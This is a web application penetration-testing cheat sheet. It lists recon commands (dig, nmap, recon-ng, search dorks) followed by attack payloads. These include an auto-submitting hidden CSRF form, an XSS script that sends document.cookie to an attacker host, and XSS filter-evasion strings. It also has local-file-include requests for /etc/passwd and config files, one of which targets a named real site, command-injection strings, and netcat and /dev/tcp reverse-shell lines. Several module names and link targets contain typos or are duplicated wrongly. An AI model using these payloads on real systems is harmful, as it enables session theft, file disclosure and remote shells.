---
title: Recon
category: Web Application
order: 1
---

> **WHOIS and DNS**

**DIG and nslookup:**

{% highlight bash %}
#nslookup
nslookup site.org

# DIG
# check Answer section
dig site.org -t any
# any record from 192
dig @[DNSServerIP] site.org -t any
# MX records
dig @[DNSServerIP] site.org -t mx
# Zone Transfer
dig @[DNSServerIP]site.org -t axfr
# PTR reverse lookup
dig -x 192.168.1.2
# Query nameserver's version of BIND
dig @[DNSServerIP] version.bind chaos txt
{% endhighlight %}

**NMAP, DNSRecon, and Metasploit:**

{% highlight bash %}
# NMAP
# locate .nse | grep DNS to find scripts
# less the script and look at args and usage
# use DNSRecon list as well /dnsrecon/namelist.txt
nmap --script=dns-brute site.org
nmap -sl 192.168.1.0/24 | grep \)

# domain list is much larger than nmap
dnsrecon.py -d site.org -t brt
dnsrecon.py -r 192.168.1.0/24

# metasploit
auxiliary/gather/dns-bruteforce
auxiliary/gather/dns-cache-scraper
auxiliary/gather/dns_info
auiliary/gather/dns_reverse_lookup
auiliary/gather/dns_srv_enum
{% endhighlight %}


> **Open Source Information**

**Google and Bing Hacking**

{% highlight bash %}
#Google Directives
site:www.sans.org
inurl:phpinfo
intitle:"Admin Login"
link:sans.org
ext:xls
- (negate)

# Bing Directives 
site:www.sans.org
inanchor:phpinfo
intitle:"Admin Login"
filetype:xls
not (negate)
{% endhighlight %}

**The Harvester**

{% highlight bash %}
theHarvester -d site.org -b all
{% endhighlight %}

**FOCA**

* [FOCA](https://www.elevenpaths.com/labstools/foca/index.html)

**Recon-ng**

{% highlight bash %}
# Usage
# Use [module - recon/[input]-[output]/module]
# show info

#Contacts
recon/contacts-social/dev-diver
recon/contacts-contacts/namechk
recon/companies-contacts/linkedin_auth
recon/companies-contacts/jigsaw
recon/domains-contacts/pgp_search

#Creds
recon/contacts-creds/
recon/creds-creds/
recon/domains-creds/pwnedlist/

#host
recon/hosts-hosts/resolve
recon/domain-hosts/netcraft
recon/hosts-hosts/bin_ip
recon/domain-hosts/shodan_hostname

#Geo
recon/locations-pushpins/picasa
recon/locations-pushpins/shodan
recon/locations-pushpins/twitter
recon/location-pushpins/youtube
{% endhighlight %}



> **Framework and Configuration**

**User Agent Differences**

{% highlight bash %}
nmap -p80 --script http-useragent-tester.nse [host]
{% endhighlight %}


**SSL/TLS Version**

{% highlight bash %}
#openssl
openssl s_client -connect www.site.org:443-ssl2
openssl s_client -connect www.site.org:443 -cipher NULL

#nmap
nmap -p 443 --script=ssl-enum-ciphers www.site.org
{% endhighlight %}

SSLLabs
* [SSLLabs](www.ssllabs.com)


**Framework and Configuration**

{% highlight bash %}
#Look for the following:
# known vulnerabilities
# Technologies versions to customize attacks (OS, platform, web server) such as case sensativity
# Supported methods (Put, Delete)
# Ports and Services

#NMAP
#Heartbleed
nmap -p 443 --script=ssl-heartbleed.nse www.site.org
#Service Detection
nmap -sV scanme.nmap.org
#Enum - like Nikto
nmap --script=http-enum www.sec542.org
#Methods
nmap --script=http-method www.sec542.org

# netcraft
toolbar.netcraft.com/site_report

#Wappalizer 
https://wappalizer.com
{% endhighlight %}









> **CSRF**

GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

> **XSS**

Get Cookie:
{% highlight html %}
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}



> **XSS Test Strings**

{% highlight html %}
'';!--"<XSS>=&{()}
{% endhighlight %}

{% highlight html %}
<script>alert(document.cookie);</script>

<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>

<script src=http://www.example.com/malicious-code.js></script>

%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e

\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e

>"><script>alert("XSS")</script>&

"><STYLE>@import"javascript:alert('XSS')";</STYLE>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')> 

<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>

<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">

{% endhighlight %}



> **Local File Include**

{% highlight bash %}
#Automated Tool
fimap -u 'http://website/?p=file.html'

#Test for Local File Include
http://website/?p=file%3a%2f%2f%2fetc%2fpasswd

#Grab data
http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php

#Rebuild Base64 file (e.g.,executable)
base64 -d extractedBase64File > executable2
curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d

{% endhighlight %}

> **Command Injection**
{% highlight bash %}
#Commix Automated Tool
commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"


#Test Strings
test`pwd`
test$(pwd)
test; pwd
test | pwd
test && pwd
{% endhighlight %}

> **Blind Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Sleep method
http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
{% endhighlight %}

> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)

> **Useful Tools**
* [SQLMap](http://sqlmap.org)

